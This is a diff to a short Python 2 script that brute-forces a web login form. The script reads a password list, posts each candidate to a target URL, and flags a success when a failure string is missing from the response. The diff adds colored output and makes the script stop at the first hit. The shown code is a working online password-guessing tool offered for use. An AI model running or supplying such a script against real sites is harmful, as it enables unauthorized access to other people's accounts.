@@ -1,15 +1,19 @@
 import requests
-import hashlib
-import re
-
 from argparse import ArgumentParser, ArgumentTypeError
+
+class bc:
+    okblue = '\033[94m'
+    okgreen = '\033[92m'
+    red = '\033[91m'
+    endc = '\033[0m'
+    bold = '\033[1m'
 
 
 def args():
 	args = ArgumentParser()
 	args.add_argument('-pwd', help='password list')
-	args.add_argument('-url', help='password list')
-	args.add_argument('-data', help='name:value&password=^pwd^')
+	args.add_argument('-url', help='taret url')
+	args.add_argument('-data', help='name=value&password=^pwd^')
 	args.add_argument('-w', help='opposite response')
 	return args.parse_args()
 
@@ -31,8 +35,11 @@ def pAramms(dynPassword):
 
 rq = requests.session()
 for psw in pwdfile:
-	out = rq.post(url = url, data = pAramms(psw.strip('\n')))
+	out = rq.post(url = url, data = pAramms(psw.strip("\n")))
 	if(wResponse not in out.text):
+		print bc.okgreen + bc.bold
 		print pAramms(psw)
+		print "\n"+bc.endc
+		break
 	else:
-		print "[ATTEMPT] -target "+url+" -key "+psw.strip('\n')
+		print "[ATTEMPT] -target "+ bc.okblue + url + bc.endc +" -key "+ bc.bold + bc.red + psw.strip('\n') + bc.endc
